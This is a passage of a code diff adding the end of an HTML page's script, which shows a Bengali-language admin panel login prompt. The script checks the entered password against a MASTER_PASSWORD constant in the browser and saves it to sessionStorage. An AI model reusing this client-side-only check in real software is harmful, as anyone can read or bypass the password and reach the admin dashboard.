+                let pwDiv = document.createElement('div'); pwDiv.className='password-screen';
+                pwDiv.innerHTML=`<div class="password-box"><h2>🔐 অ্যাডমিন প্যানেল</h2><input type="password" id="adminPass" placeholder="পাসওয়ার্ড"><button id="verifyBtn" class="success">প্রবেশ</button><div id="err" style="color:red;margin-top:8px;"></div></div>`;
+                document.body.appendChild(pwDiv);
+                document.getElementById('verifyBtn').onclick=()=>{ let val=document.getElementById('adminPass').value; if(val===MASTER_PASSWORD){ sessionStorage.setItem('monitor_auth',MASTER_PASSWORD); pwDiv.remove(); initDashboard(); } else{ document.getElementById('err').innerText='ভুল পাসওয়ার্ড'; } };
+            }
+        }
+    })();
+</script>
+</body>
+</html>
